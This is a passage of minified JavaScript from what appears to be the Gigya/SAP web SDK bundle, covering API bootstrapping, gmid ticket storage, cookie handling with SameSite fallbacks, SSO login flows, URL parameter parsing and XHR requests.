          }), i;
        }(window.gigya.utils.URL.getGigParamsFromURL({
          url: i,
          paramPrefix: n
        }), o) : {};
      };
    },
    100: function (e, t, i) {
      Object.defineProperty(t, "__esModule", {
        value: !0
      });
      var n = i(0),
        o = i(68),
        r = i(77),
        a = i(85).GmidProvider.HasGmid,
        s = i(2);
      t.TokenKeys = {
        GMID: "gig_gmid",
        UCID: "gig_ucid",
        GMID_TICKET: "gmidTicket",
        GMID_TICKET_EXPIRATION_TIME: "gmidTicketExpiration"
      };
      var u = function () {
        function e(e, t, i, n, a, s) {
          void 0 === n && (n = new o.GroupApiDomainService()), void 0 === a && (a = new r.RequestProvider()), this._apiKey = e, this._hasGmid = t, this._domainResolver = i, this._groupApiDomainService = n, this._requestProvider = a, this.didFallback = !1, s && (this._storage = s);
        }
        return e.prototype.getApiDomain = function (e) {
          return n.__awaiter(this, void 0, void 0, function () {
            return n.__generator(this, function (t) {
              return [2, this._domainResolver.getApiDomain(e)];
            });
          });
        }, e.prototype.bootstrap = function (e) {
          return void 0 === e && (e = !1), n.__awaiter(this, void 0, void 0, function () {
            var t, i, o, r, a, s;
            return n.__generator(this, function (n) {
              switch (n.label) {
                case 0:
                  return t = window.gigya.logger.group("bootstrap api service"), this._storage ? [3, 2] : (window.gigya.logger.debug("init storage"), i = this, [4, new gigya.Promise(function (e) {
                    window.gigya.utils.localStorage.waitForService(function (t) {
                      e(t);
                    });
                  })]);
                case 1:
                  i._storage = n.sent(), n.label = 2;
                case 2:
                  return !this._hasGmid || e ? [3, 3] : (window.gigya.logger.info("already has gmid"), [3, 10]);
                case 3:
                  if (window.gigya.logger.info(this._hasGmid ? "forcing bootstrap" : "no gmid set"), this._useStorage || !this.canSaveGmidAsCookie()) return [3, 8];
                  window.gigya.logger.info("save gmid as cookie"), n.label = 4;
                case 4:
                  return n.trys.push([4, 6,, 7]), [4, this.sendRequest({
                    methodName: "accounts.webSdkBootstrap",
                    params: {
                      apiKey: this._apiKey
                    }
                  })];
                case 5:
                  if (0 !== (o = n.sent()).errorCode) throw "error bootstrapping sdk\n" + JSON.stringify(o, null, 4);
                  return [3, 7];
                case 6:
                  throw r = n.sent(), new Error("accounts.webSdkBootstrap failed: " + r);
                case 7:
                  return [3, 10];
                case 8:
                  return window.gigya.logger.info("save gmid in storage"), [4, this.setupWithStorage(e)];
                case 9:
                  n.sent(), this._useStorage = !0, n.label = 10;
                case 10:
                  return this._useStorage ? [4, this.getGmidTicket()] : [3, 12];
                case 11:
                  return a = n.sent(), [3, 13];
                case 12:
                  s = window.gigya.utils.cookie.get("hasGmid") || (null == o ? void 0 : o.hasGmid), this.cleanStorage(), n.label = 13;
                case 13:
                  return t.end(), [2, {
                    ticketInfo: a,
                    hasGmid: s
                  }];
              }
            });
          });
        }, e.prototype.setGroupApiDomain = function (e) {
          window.gigya._.getBaseDomain(window.gigya.partnerSettings.baseDomains, this._domainResolver.originDomain, ["gigya.com", "cn1.sapcdm.cn", window.gigya.defaultApiDomain]) !== window.gigya.defaultApiDomain && this._groupApiDomainService.set(e);
        }, e.prototype.canSaveGmidAsCookie = function () {
          return s.FlagService.alwaysCheckCookieSave ? this._domainResolver.isApiDomainFirstParty || this._domainResolver.canSaveGmidAsCookie : this._domainResolver.isApiDomainFirstParty || window.gigya.utils.cookie.canSaveCookie();
        }, e.prototype.sendRequest = function (e) {
          var i, o;
          return n.__awaiter(this, void 0, void 0, function () {
            var r, a, s, u, c, l;
            return n.__generator(this, function (n) {
              switch (n.label) {
                case 0:
                  return e ? (r = e.methodName, (a = window.gigya.utils.object.clone(e.params, !0, !0)).pageURL = this._domainResolver.originDomain, this._useStorage && (a.gmid = this._storage.getItem(t.TokenKeys.GMID), a.ucid = this._storage.getItem(t.TokenKeys.UCID)), u = "https://", [4, this.getApiDomain(null !== (o = null === (i = e.settings) || void 0 === i ? void 0 : i.namespace) && void 0 !== o ? o : e.methodName)]) : (window.gigya.logger.error("ApiService: request data must has methodName and params"), [2]);
                case 1:
                  s = u + n.sent(), n.label = 2;
                case 2:
                  return n.trys.push([2, 4,, 5]), [4, this._requestProvider.send(s, r, a, e.settings, e.headers)];
                case 3:
                  return c = n.sent(), [3, 5];
                case 4:
                  return l = n.sent(), this.didFallback ? c = l : (this.didFallback = !0, c = this.sendRequestFallback(s, r, a, e, l)), [3, 5];
                case 5:
                  return [2, c];
              }
            });
          });
        }, e.prototype.setupWithStorage = function (e) {
          var i;
          return n.__awaiter(this, void 0, void 0, function () {
            var o, r, s, u, c, l;
            return n.__generator(this, function (n) {
              switch (n.label) {
                case 0:
                  return o = this._storage.getItem(t.TokenKeys.GMID), r = parseInt(this._storage.getItem(t.TokenKeys.GMID_TICKET_EXPIRATION_TIME)), s = Boolean(o), u = null === (i = window.gigya.utils.array.getArrayFromString(o, ".")) || void 0 === i ? void 0 : i[1], e && u !== a.ver4 || !s ? (window.gigya.logger.info("getting gmid by endpoint"), [4, this.getIds()]) : [3, 2];
                case 1:
                  if (!(c = n.sent()).gcid || !c.ucid) throw "ApiService getIDs: the request to the endpoint failed";
                  return window.gigya.logger.info("setting gmid in storage"), this._storage.setItem(t.TokenKeys.GMID, c.gcid), this._storage.setItem(t.TokenKeys.UCID, c.ucid), l = this.createTicketResponse(c.gmidTicket), this.updateGmidTicket(l), [3, 5];
                case 2:
                  return window.gigya.utils.validation.isLaterThanNow(r) ? [3, 4] : [4, this.refreshGmidTicketFromServer()];
                case 3:
                  return n.sent(), [3, 5];
                case 4:
                  window.gigya.logger.info("already has gmid in storage"), n.label = 5;
                case 5:
                  return [2];
              }
            });
          });
        }, e.prototype.getGmidTicket = function (e) {
          return void 0 === e && (e = !1), n.__awaiter(this, void 0, void 0, function () {
            var i, o;
            return n.__generator(this, function (n) {
              switch (n.label) {
                case 0:
                  return (i = this._storage.getItem(t.TokenKeys.GMID_TICKET)) || e ? [3, 1] : [2, void 0];
                case 1:
                  return o = parseInt(this._storage.getItem(t.TokenKeys.GMID_TICKET_EXPIRATION_TIME)), !e && i && window.gigya.utils.validation.isLaterThanNow(o) ? [2, {
                    gmidTicket: i,
                    expirationTime: parseInt(this._storage.getItem(t.TokenKeys.GMID_TICKET_EXPIRATION_TIME))
                  }] : [3, 2];
                case 2:
                  return this.deleteGmidTicket(), [4, this.refreshGmidTicketFromServer()];
                case 3:
                  return [2, n.sent()];
              }
            });
          });
        }, e.prototype.sendReport = function (e, t) {
          return n.__awaiter(this, void 0, void 0, function () {
            var i, o;
            return n.__generator(this, function (n) {
              switch (n.label) {
                case 0:
                  return Math.floor(100 * Math.random()) <= 5 ? [2] : (i = {
                    message: e,
                    apiKey: window.gigya.apiKey,
                    page: this._domainResolver.originDomain,
                    buildVersion: window.gigya.build.version,
                    format: "json",
                    sdk: "web"
                  }, t && (i.details = JSON.stringify(t)), o = {
                    methodName: "sdk.errorReport",
                    params: i
                  }, [4, this.sendRequest(o)]);
                case 1:
                  return n.sent(), [2];
              }
            });
          });
        }, e.prototype.refreshGmidTicketFromServer = function () {
          return n.__awaiter(this, void 0, void 0, function () {
            var e;
            return n.__generator(this, function (i) {
              switch (i.label) {
                case 0:
                  return window.gigya.logger.info("refreshing gmid ticket"), [4, this.createGmidTicket(this._storage.getItem(t.TokenKeys.GMID))];
                case 1:
                  return (e = i.sent()) && e.gmidTicket && this.updateGmidTicket(e), [2, e];
              }
            });
          });
        }, e.prototype.updateGmidTicket = function (e) {
          window.gigya.logger.info("updating gmid ticket", e), this._storage.setItem(t.TokenKeys.GMID_TICKET, e.gmidTicket), this._storage.setItem(t.TokenKeys.GMID_TICKET_EXPIRATION_TIME, String(e.expirationTime));
        }, e.prototype.deleteGmidTicket = function () {
          this._storage.removeItem(t.TokenKeys.GMID_TICKET), this._storage.removeItem(t.TokenKeys.GMID_TICKET_EXPIRATION_TIME);
        }, e.prototype.cleanStorage = function () {
          this._storage.removeItem(t.TokenKeys.GMID), this._storage.removeItem(t.TokenKeys.UCID), this.deleteGmidTicket();
        }, e.prototype.getIds = function () {
          return this.sendRequest({
            methodName: "socialize.getIDs",
            params: {
              APIKey: this._apiKey,
              includeTicket: !0
            }
          });
        }, e.prototype.createGmidTicket = function (e, t) {
          var i = this;
          void 0 === t && (t = window.gigya.partnerSettings.gmidTicketExpiration || 3600);
          var n = {
            apiKey: this._apiKey,
            expires: t
          };
          return e && (n.gmid = e), this.sendRequest({
            methodName: "socialize.getGmidTicket",
            params: n
          }).then(function (e) {
            if (e && e.gmidTicket) return i.createTicketResponse(e.gmidTicket);
            window.gigya.logger.error("Failed to establish gmidTicket", {
              response: JSON.stringify(e),
              method: "socialize.getGmidTicket"
            }), i.deleteGmidTicket();
          });
        }, e.prototype.createTicketResponse = function (e) {
          var t = new Date();
          return t.setHours(t.getHours() + 1), {
            gmidTicket: e,
            expirationTime: t.getTime()
          };
        }, e.prototype.sendRequestFallback = function (e, t, i, o, r) {
          return n.__awaiter(this, void 0, void 0, function () {
            var a, u, c;
            return n.__generator(this, function (n) {
              switch (n.label) {
                case 0:
                  for (window.gigya.logger.report("ApiService: Fallback with api flags turned off", {
                    baseDomain: e,
                    methodName: t,
                    params: i,
                    data: o,
                    err: r
                  }), a = 0, u = s.FlagService.apiFlags; a < u.length; a++) c = u[a], window.gigya._.config.flags[c] = !1;
                  return [4, this._requestProvider.send(e, t, i, o.settings, o.headers)];
                case 1:
                  return [2, n.sent()];
              }
            });
          });
        }, e;
      }();
      t.ApiService = u;
    },
    11: function (e, t) {
      Object.defineProperty(t, "__esModule", {
        value: !0
      }), function (e) {
        e[e.gigyaPhone = 0] = "gigyaPhone", e[e.gigyaTotp = 1] = "gigyaTotp", e[e.gigyaPush = 2] = "gigyaPush", e[e.livelink = 3] = "livelink";
      }(t.EditableTfaProvidersTypes || (t.EditableTfaProvidersTypes = {})), t.gigyaAssertionExpiration = 3e5, t.sensitiveParamsOverride = "login_token", t.GIGYA_PARAM_PREFIX = "gig_", t.GIGYA_INTERNAL_PARAM_PREFIX = t.GIGYA_PARAM_PREFIX + "i_", t.GIGYA_INTERNAL_PARAMS = t.GIGYA_PARAM_PREFIX + "actions";
    },
    12: function (e, t, i) {
      Object.defineProperty(t, "__esModule", {
        value: !0
      });
      var n = i(0),
        o = i(3),
        r = i(28),
        a = function () {
          function e(e) {
            void 0 === e && (e = new r.CookieStore()), this._cookieStore = e;
          }
          return e.prototype.set = function (e, t, i, n, r, a) {
            null == n && (n = this.getDefaultDomain());
            var s = r ? "" : "/",
              u = this._getExpirationInMs(i),
              c = null;
            null != u && (c = new Date()).setTime(c.getTime() + u);
            var l = this._setCookieInternal(e, t, s, c, n, a),
              g = !u || u > 0;
            if (g === l) return !0;
            var d = o.localInfo.pageDomain;
            return (l = this._setCookieInternal(e, t, s, c, d, a)) === g;
          }, e.prototype.get = function (e) {
            return this._cookieStore.getCookie(e);
          }, e.prototype.remove = function (e, t) {
            void 0 === t && (t = o.localInfo.pageDomain), this._removeFromBaseDomains(e, t), this.set(e, "", -1, "", !1), this.set(e, "", -1, "", !0);
          }, e.prototype.getInfiniteExpirationTimeInSeconds = function () {
            return 31536e3;
          }, e.prototype.canSaveCookie = function (t) {
            void 0 === t && (t = null);
            try {
              return this.set(e.testCookieName, "true", 1, t, null);
            } catch (e) {
              return !1;
            }
          }, e.prototype.getDefaultDomain = function (e, t) {
            return void 0 === e && (e = o.localInfo.pageDomain), void 0 === t && (t = o.localInfo.baseDomain || ""), t.length > 0 && e.length >= t.length && e.lastIndexOf(t) === e.length - t.length ? t : e;
          }, e.prototype._getExpirationInMs = function (e) {
            return null == e || "" === e || isNaN(e) ? 1e3 * this.getInfiniteExpirationTimeInSeconds() : 0 == e ? null : 1e3 * e;
          }, e.prototype._setCookieInternal = function (t, i, n, r, a, s) {
            var u;
            void 0 === s && (s = e._getSameSiteMode());
            var c = 0 === (null !== (u = null === o.localInfo || void 0 === o.localInfo ? void 0 : o.localInfo.protocol) && void 0 !== u ? u : document.location.protocol).indexOf("https");
            return this._cookieStore.setCookie(t, i, {
              path: n,
              expires: r,
              domain: a,
              sameSite: s,
              secure: c
            }), !!this.get(t) || !!s && ("None" !== s && this._fallbackToSameSiteNone(t, i, n, r, a, c), this.get(t) ? (this._reportFallback("Setting SameSite=None", {
              name: t,
              value: i,
              sameSiteMode: s
            }), !0) : (this._cookieStore.setCookie(t, i, {
              path: n,
              expires: r,
              domain: a,
              secure: c
            }), !!this.get(t) && (this._reportFallback("Cookie established only without sameSite mode", {
              name: t,
              value: i,
              sameSiteMode: s
            }), !0)));
          }, e.prototype._removeFromBaseDomains = function (e, t) {
            for (var i = t.split("."), n = 0; n < i.length - 1; n++) {
              var o = i.slice(n).join(".");
              this.set(e, "", -1, o, !1), this.set(e, "", -1, o, !0);
            }
          }, e._getSameSiteMode = function () {
            if (!e._disallowSameSiteMode()) return "None";
          }, e._disallowSameSiteMode = function () {
            var e,
              t,
              i = null !== (e = null === o.localInfo || void 0 === o.localInfo ? void 0 : o.localInfo.protocol) && void 0 !== e ? e : document.location.protocol,
              n = null !== (t = null === o.localInfo || void 0 === o.localInfo ? void 0 : o.localInfo.userAgent) && void 0 !== t ? t : navigator.userAgent.toLowerCase();
            return !(0 === i.indexOf("https")) || !n || n.indexOf("CPU iPhone OS 12") > -1 || n.indexOf("iPad; CPU OS 12") > -1 || n.indexOf("Macintosh; Intel Mac OS X 10_14") > -1 && n.indexOf("Version/") > -1 && n.indexOf("Safari") > -1 || n.indexOf("Chrome/5") > -1 && n.indexOf("Chrome/6") > -1;
          }, e.prototype._fallbackToSameSiteNone = function (e, t, i, n, o, r) {
            this._cookieStore.setCookie(e, t, {
              path: i,
              expires: n,
              domain: o,
              sameSite: "None",
              secure: r
            });
          }, e.prototype._reportFallback = function (e, t) {
            window.gigya.logger.report("Cookie Policy Fallback: " + e, n.__assign(n.__assign({}, t), {
              isIframe: this._isIFrame()
            }), !1);
          }, e.prototype._isIFrame = function () {
            var e;
            try {
              return (null === window || void 0 === window ? void 0 : window.location) !== (null === (e = null === window || void 0 === window ? void 0 : window.parent) || void 0 === e ? void 0 : e.location);
            } catch (e) {
              return !0;
            }
          }, e.testCookieName = "gig3pctest", e;
        }();
      t.CookieUtils = a, t.default = new a();
    },
    120: function (e, t, i) {
      Object.defineProperty(t, "__esModule", {
        value: !0
      });
      var n = i(0),
        o = i(24),
        r = i(98),
        a = i(49),
        s = i(17),
        u = i(11),
        c = i(121);
      function l() {
        var e, t;
        return window.gigya.partnerSettings.ssoKey ? !!(null === (t = null === (e = window.gigya.thisScript) || void 0 === e ? void 0 : e.globalConf) || void 0 === t ? void 0 : t.storageDomainOverride) || (window.gigya.logger.warn("Central login page must configure storageDomainOverride in webSDK Configuration"), !1) : (window.gigya.logger.warn("Not in SSO Group"), !1);
      }
      t.ssoLogin = function (e) {
        void 0 === e && (e = {}), l() && (window.gigya.utils.toggles.isOn("keepSessionOnSSOLogin") || o.remove(), window.gigya.accounts.sso.login(e));
      }, t.continueSso = function (e) {
        var t, i, u, c, g;
        return void 0 === e && (e = {}), n.__awaiter(this, void 0, void 0, function () {
          var d, f, p, h, y, v, w, m;
          return n.__generator(this, function (_) {
            switch (_.label) {
              case 0:
                return s.hold("ssoContinue", "API"), d = window.gigya.logger.group("sso.continue"), f = function (e) {
                  return e && window.gigya.logger.warn(e), s.release("ssoContinue", "API"), d.end();
                }, l() ? (p = window.gigya.getUrlParam("ssoToken"), h = window.gigya.getUrlParam("scope"), p ? (y = (null === (i = null === (t = window.gigya.thisScript) || void 0 === t ? void 0 : t.globalConf) || void 0 === i ? void 0 : i.APIKey) || (null === (u = window.gigya.thisScript) || void 0 === u ? void 0 : u.APIKey), (w = o.get(y)) ? [3, 2] : [4, r.syncGroupToken(y)]) : [2, f("ssoToken must be present in the url")]) : [2, f()];
              case 1:
                w = _.sent(), _.label = 2;
              case 2:
                return (v = w) ? (e.sdk = "js_" + ((null === (c = window.gigya.build) || void 0 === c ? void 0 : c.version) || ""), e.sdkBuild = (null === (g = window.gigya.build) || void 0 === g ? void 0 : g.number) || 0, d.end(), "device_sso" === h ? (m = n.__assign({
                  context: p,
                  login_token: v
                }, e), window.gigya.logger.info("redirect to oidc continue with params: ", m), window.gigya.fidm.oidc.op.redirectToContinue(n.__assign({
                  opKey: window.gigya.partnerSettings.ssoKey
                }, m))) : (m = {
                  ssoToken: p,
                  login_token: v,
                  APIKey: y
                }, window.gigya.logger.info("redirect to sso.continue with params: ", m), a.redirect("https://" + window.gigya._.getApiDomain() + "/accounts.sso.continue", [m, e], "POST")), [2]) : [2, f("can't continue with SSO login, missing local session")];
            }
          });
        });
      }, t.getSsoContext = function (e) {
        var t;
        null == e || e.callback((null === (t = window.gigya._.sso) || void 0 === t ? void 0 : t.context) || {});
      }, t.setSsoContext = function (e) {
        try {
          var t = new c.default().getGigParamsFromURL().removeUnacceptableParams(new RegExp(u.GIGYA_INTERNAL_PARAM_PREFIX + "|" + u.GIGYA_INTERNAL_PARAMS + "|gig_ssoToken")).removePrefix().toObject(),
            i = (null == e ? void 0 : e.rpContext) ? JSON.parse(e.rpContext) : {};
          window.gigya._.sso.context = n.__assign(n.__assign({}, t), i);
        } catch (e) {
          window.gigya.logger.report("failed to set sso context");
        }
      };
    },
    121: function (e, t, i) {
      Object.defineProperty(t, "__esModule", {
        value: !0
      });
      var n = i(11),
        o = i(122),
        r = i(10),
        a = function () {
          function e(e) {
            var t = this;
            void 0 === e && (e = window.gigya._.WindowProvider), this._win = e, this.currentParams = [], new URLSearchParams(e.location().search).forEach(function (e, i) {
              var n;
              try {
                n = {
                  key: r.URLDecode(i),
                  value: r.URLDecode(e)
                };
              } catch (t) {
                n = {
                  key: i,
                  value: e
                }, window.gigya.logger.report("failed to decode url param", {
                  urlParam: n
                });
              }
              t.currentParams.push(n);
            });
          }
          return e.prototype.getGigParamsFromURL = function (e) {
            return void 0 === e && (e = n.GIGYA_PARAM_PREFIX), this.currentParams = this.currentParams.filter(function (t) {
              return 0 === t.key.indexOf(e) && t.key !== e;
            }), this;
          }, e.prototype.removePrefix = function (e) {
            return void 0 === e && (e = n.GIGYA_PARAM_PREFIX), this.currentParams.forEach(function (t) {
              t.key.startsWith(e) && (t.key = t.key.slice(e.length));
            }), this;
          }, e.prototype.keysToLower = function () {
            return this.currentParams.forEach(function (e) {
              e.key = e.key.toLowerCase();
            }), this;
          }, e.prototype.removeUnacceptableParams = function (e) {
            return e ? (this.currentParams = this.currentParams.filter(function (t) {
              return !e.test(t.key);
            }), this) : this;
          }, e.prototype.toObject = function () {
            var e = {};
            return this.currentParams.forEach(function (t) {
              o(e, t.key, t.value);
            }), e;
          }, e;
        }();
      t.default = a;
    },
    122: function (e, t, i) {
      (function (t) {
        var i = /\.|\[(?:[^[\]]*|(["'])(?:(?!\1)[^\\]|\\.)*?\1)\]/,
          n = /^\w*$/,
          o = /^\./,
          r = /[^.[\]]+|\[(?:(-?\d+(?:\.\d+)?)|(["'])((?:(?!\2)[^\\]|\\.)*?)\2)\]|(?=(?:\.|\[\])(?:\.|\[\]|$))/g,
          a = /\\(\\)?/g,
          s = /^\[object .+?Constructor\]$/,
          u = /^(?:0|[1-9]\d*)$/,
          c = "object" == typeof t && t && t.Object === Object && t,
          l = "object" == typeof self && self && self.Object === Object && self,
          g = c || l || Function("return this")();
        var d,
          f = Array.prototype,
          p = Function.prototype,
          h = Object.prototype,
          y = g["__core-js_shared__"],
          v = (d = /[^.]+$/.exec(y && y.keys && y.keys.IE_PROTO || "")) ? "Symbol(src)_1." + d : "",
          w = p.toString,
          m = h.hasOwnProperty,
          _ = h.toString,
          b = RegExp("^" + w.call(m).replace(/[\\^$.*+?()[\]{}|]/g, "\\$&").replace(/hasOwnProperty|(function).*?(?=\\\()| for .+?(?=\\\])/g, "$1.*?") + "$"),
          S = g.Symbol,
          k = f.splice,
          I = M(g, "Map"),
          P = M(Object, "create"),
          x = S ? S.prototype : void 0,
          O = x ? x.toString : void 0;
        function T(e) {
          var t = -1,
            i = e ? e.length : 0;
          for (this.clear(); ++t < i;) {
            var n = e[t];
            this.set(n[0], n[1]);
          }
        }
        function A(e) {
          var t = -1,
            i = e ? e.length : 0;
          for (this.clear(); ++t < i;) {
            var n = e[t];
            this.set(n[0], n[1]);
          }
        }
        function C(e) {
          var t = -1,
            i = e ? e.length : 0;
          for (this.clear(); ++t < i;) {
            var n = e[t];
            this.set(n[0], n[1]);
          }
        }
        function E(e, t, i) {
          var n = e[t];
          m.call(e, t) && K(n, i) && (void 0 !== i || t in e) || (e[t] = i);
        }
        function R(e, t) {
          for (var i = e.length; i--;) if (K(e[i][0], t)) return i;
          return -1;
        }
        function D(e) {
          return !(!z(e) || (t = e, v && v in t)) && (function (e) {
            var t = z(e) ? _.call(e) : "";
            return "[object Function]" == t || "[object GeneratorFunction]" == t;
          }(e) || function (e) {
            var t = !1;
            if (null != e && "function" != typeof e.toString) try {
              t = !!(e + "");
            } catch (e) {}
            return t;
          }(e) ? b : s).test(function (e) {
            if (null != e) {
              try {
                return w.call(e);
              } catch (e) {}
              try {
                return e + "";
              } catch (e) {}
            }
            return "";
          }(e));
          var t;
        }
        function L(e, t, o, r) {
          if (!z(e)) return e;
          for (var a = -1, s = (t = function (e, t) {
              if (q(e)) return !1;
              var o = typeof e;
              if ("number" == o || "symbol" == o || "boolean" == o || null == e || B(e)) return !0;
              return n.test(e) || !i.test(e) || null != t && e in Object(t);
            }(t, e) ? [t] : function (e) {
              return q(e) ? e : G(e);
            }(t)).length, u = s - 1, c = e; null != c && ++a < s;) {
            var l = N(t[a]),
              g = o;
            if (a != u) {
              var d = c[l];
              void 0 === (g = r ? r(d, l, c) : void 0) && (g = z(d) ? d : F(t[a + 1]) ? [] : {});
            }
            E(c, l, g), c = c[l];
          }
          return e;
        }
        function j(e, t) {
          var i,
            n,
            o = e.__data__;
          return ("string" == (n = typeof (i = t)) || "number" == n || "symbol" == n || "boolean" == n ? "__proto__" !== i : null === i) ? o["string" == typeof t ? "string" : "hash"] : o.map;
        }
        function M(e, t) {
          var i = function (e, t) {
            return null == e ? void 0 : e[t];
          }(e, t);
          return D(i) ? i : void 0;
        }
        function F(e, t) {
          return !!(t = null == t ? 9007199254740991 : t) && ("number" == typeof e || u.test(e)) && e > -1 && e % 1 == 0 && e < t;
        }
        T.prototype.clear = function () {
          this.__data__ = P ? P(null) : {};
        }, T.prototype.delete = function (e) {
          return this.has(e) && delete this.__data__[e];
        }, T.prototype.get = function (e) {
          var t = this.__data__;
          if (P) {
            var i = t[e];
            return "__lodash_hash_undefined__" === i ? void 0 : i;
          }
          return m.call(t, e) ? t[e] : void 0;
        }, T.prototype.has = function (e) {
          var t = this.__data__;
          return P ? void 0 !== t[e] : m.call(t, e);
        }, T.prototype.set = function (e, t) {
          return this.__data__[e] = P && void 0 === t ? "__lodash_hash_undefined__" : t, this;
        }, A.prototype.clear = function () {
          this.__data__ = [];
        }, A.prototype.delete = function (e) {
          var t = this.__data__,
            i = R(t, e);
          return !(i < 0) && (i == t.length - 1 ? t.pop() : k.call(t, i, 1), !0);
        }, A.prototype.get = function (e) {
          var t = this.__data__,
            i = R(t, e);
          return i < 0 ? void 0 : t[i][1];
        }, A.prototype.has = function (e) {
          return R(this.__data__, e) > -1;
        }, A.prototype.set = function (e, t) {
          var i = this.__data__,
            n = R(i, e);
          return n < 0 ? i.push([e, t]) : i[n][1] = t, this;
        }, C.prototype.clear = function () {
          this.__data__ = {
            hash: new T(),
            map: new (I || A)(),
            string: new T()
          };
        }, C.prototype.delete = function (e) {
          return j(this, e).delete(e);
        }, C.prototype.get = function (e) {
          return j(this, e).get(e);
        }, C.prototype.has = function (e) {
          return j(this, e).has(e);
        }, C.prototype.set = function (e, t) {
          return j(this, e).set(e, t), this;
        };
        var G = U(function (e) {
          var t;
          e = null == (t = e) ? "" : function (e) {
            if ("string" == typeof e) return e;
            if (B(e)) return O ? O.call(e) : "";
            var t = e + "";
            return "0" == t && 1 / e == -1 / 0 ? "-0" : t;
          }(t);
          var i = [];
          return o.test(e) && i.push(""), e.replace(r, function (e, t, n, o) {
            i.push(n ? o.replace(a, "$1") : t || e);
          }), i;
        });
        function N(e) {
          if ("string" == typeof e || B(e)) return e;
          var t = e + "";
          return "0" == t && 1 / e == -1 / 0 ? "-0" : t;
        }
        function U(e, t) {
          if ("function" != typeof e || t && "function" != typeof t) throw new TypeError("Expected a function");
          var i = function () {
            var n = arguments,
              o = t ? t.apply(this, n) : n[0],
              r = i.cache;
            if (r.has(o)) return r.get(o);
            var a = e.apply(this, n);
            return i.cache = r.set(o, a), a;
          };
          return i.cache = new (U.Cache || C)(), i;
        }
        function K(e, t) {
          return e === t || e != e && t != t;
        }
        U.Cache = C;
        var q = Array.isArray;
        function z(e) {
          var t = typeof e;
          return !!e && ("object" == t || "function" == t);
        }
        function B(e) {
          return "symbol" == typeof e || function (e) {
            return !!e && "object" == typeof e;
          }(e) && "[object Symbol]" == _.call(e);
        }
        e.exports = function (e, t, i) {
          return null == e ? e : L(e, t, i);
        };
      }).call(this, i(23));
    },
    128: function (e, t, i) {
      Object.defineProperty(t, "__esModule", {
        value: !0
      });
      var n = i(0),
        o = i(86),
        r = i(69),
        a = i(2),
        s = function (e) {
          function t(t, i, n, o, r) {
            void 0 === o && (o = {}), void 0 === r && (r = {});
            var a = e.call(this, t, i, n, o) || this;
            return a.headers = {}, a.xhttp = new XMLHttpRequest(), a.setRequestHeaders(r), a;
          }
          return n.__extends(t, e), t.prototype.performSend = function (e, t) {
            var i = this;
            return new gigya.Promise(function (t, n) {
              var o,
                a = i.getFullUrl();
              i.xhttp.onload = function () {
                return i.onRequestLoad(t, n);
              }, i.xhttp.onerror = function () {
                return n(i.createErrorFromResponse("XHR_FAILURE - http request onerror event"));
              }, i.xhttp.withCredentials = !0, e === r.RequestType.POST && (a = i.getUrl().href, i.hasHeaders() && (a += "?APIKey=" + i.params.APIKey), o = window.gigya.utils.keyValue.serialize(i.params), i.headers["Content-Type"] = "application/x-www-form-urlencoded"), i.xhttp.open(e, a, !0), Object.keys(i.headers).forEach(function (e) {
                i.xhttp.setRequestHeader(e, i.headers[e]);
              }), i.xhttp.send(o);
            });
          }, t.prototype.hasHeaders = function () {
            return !!Object.keys(this.headers).length;
          }, t.prototype.onRequestLoad = function (e, t) {
            var i;
            try {
              i = JSON.parse(this.xhttp.responseText);
            } catch (e) {
              window.gigya.logger.report("XHR_FAILURE - failed to parse the response object", {
                responseText: this.xhttp.responseText
              });
            }
            4 === this.xhttp.readyState && (null == i ? void 0 : i.statusCode) ? e(this.handleResponse(i)) : t(this.createErrorFromResponse("XHR_FAILURE - http request failed"));
          }, t.prototype.createErrorFromResponse = function (e) {
            return {
              errorMessage: e,
              status: this.xhttp.status,
              readyState: this.xhttp.readyState,
              responseText: this.xhttp.responseText
            };
          }, t.prototype.addDefaultParams = function () {
            e.prototype.addDefaultParams.call(this), this.params.format = "json", a.FlagService.useHttpStatusCode && this.settings.useHttpStatusCodes && (this.params.httpStatusCodes = !0);
          }, t.prototype.networkErrorResponse = function () {
            return this.handleResponse({
              errorCode: 500026,
              errorMessage: "Network_error"
            });
          }, t.prototype.dispose = function () {}, t.prototype.setRequestHeaders = function (e) {
            var t = this,
              i = ["Authorization"];
            Object.keys(e).filter(function (e) {
              return -1 !== i.indexOf(e);
            }).forEach(function (i) {
              var n = e[i];
              Boolean(n) && "string" == typeof n && (t.headers[i] = n);
            });
          }, t;
        }(o.Request);
      t.XhrRequest = s;
    },
    129: function (e, t, i) {
      Object.defineProperty(t, "__esModule", {
        value: !0
      });
      var n = i(24),
        o = function () {
          function e(e, t, i, n, o) {
            void 0 === n && (n = {}), void 0 === o && (o = 5), this.baseUrl = e, this.methodName = t, this.params = i, this.settings = n, this._maxTries = o, this._tries = 0, this.params.sdk = "js_" + window.gigya.build.version;
          }
          return e.prototype.getUrl = function () {
            return this.baseUrl + "/" + this.methodName;
          }, e.prototype.send = function (e) {
            this._tries++, this._tries <= this._maxTries ? this.sendAction() : e && e();
          }, e.prototype.getAuthParams = function () {
            var e = {};
            if (this.params.oauth_token) this.params.authMode = "token";else if (!this.params.noAuth && !this.params.regToken) {
              var t = n.get(this.params.APIKey);
              if (t) {
                this.sentLoginToken = t;
                var i = n.getGltexpCookie(this.params.APIKey);
                null != i && (e.loginTokenExp = i), e.login_token = t;
              }
              e.authMode = "cookie";
            }
            return delete this.params.noAuth, window.gigya.localInfo.isAndroidBrowser && (delete this.params.login_token, delete this.params.loginTokenExp, delete this.params.authMode), e;
          }, e.prototype.getHeaders = function () {
            return {
              Authorization: n.getBearerToken()
            };
          }, e;
        }();
      t.BaseRequest = o;
    },
    13: function (e, t, i) {
      Object.defineProperty(t, "__esModule", {
        value: !0
      });
      var n = i(3),
        o = i(39),
        r = i(9);
      t._popupContainers = [], t._pseudoContainers = [];
      var a = 999999999,
        s = null;
      function u() {
        return ++a;
      }
      function c(e, t, i) {
        e && i && (e.addEventListener ? e.addEventListener(t, i, !0) : e.attachEvent("on" + t, i));
      }
      function l(e, t, i) {
        e && i && (e.removeEventListener ? e.removeEventListener(t, i, !0) : e.detachEvent("on" + t, i));
      }
      function g() {
        s && (l(window, "hashchange", s), s = null, window.location.hash = window.location.hash.replace("|gigyaMobileDialog", ""));
      }
      function d(e, t) {
        void 0 === t && (t = window.document), t.body && t.body.appendChild(e);
      }
      function f(e) {
        var t = [];
        return "string" == typeof e.className && (t = e.className.split(" ")), t;
      }
      function p(e, t) {
        if (!e) return !1;
        if (!t) return !0;
        if (!e.className) return !1;
        for (var i = !1, n = f(e), o = 0; o < n.length; o++) if (n[o] === t) {
          i = !0;
          break;
        }
        return i;
      }
